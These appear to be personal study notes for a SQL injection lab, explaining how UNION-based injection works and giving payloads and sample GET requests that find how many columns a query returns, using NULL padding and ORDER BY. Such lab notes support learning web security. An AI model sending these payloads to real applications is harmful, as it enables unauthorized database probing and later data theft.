# lab 3 : SQL injection UNION attack, determining the number of columns returned by the query


# End goal : display the data  of more columns data


### For a UNION query to work, two key requirements must be met:

    - The individual queries must return the same number of columns. 
    - The data types in each column must be compatible between the individual queries.

# (method:1)try the different palyloads to detect the no of columns!!!
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

# just add 'union select and go increasing NULL until getting 200ok

initial payload --> GET /filter?category=Pets'+UNION+select+NULL--
second payload --> GET /filter?category=Pets'+UNION+select+NULL,+NULL--
final payload--> GET /filter?category=Pets'+UNION+select+NULL,+NULL,+NULL--


# (metthon:2) -->

' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

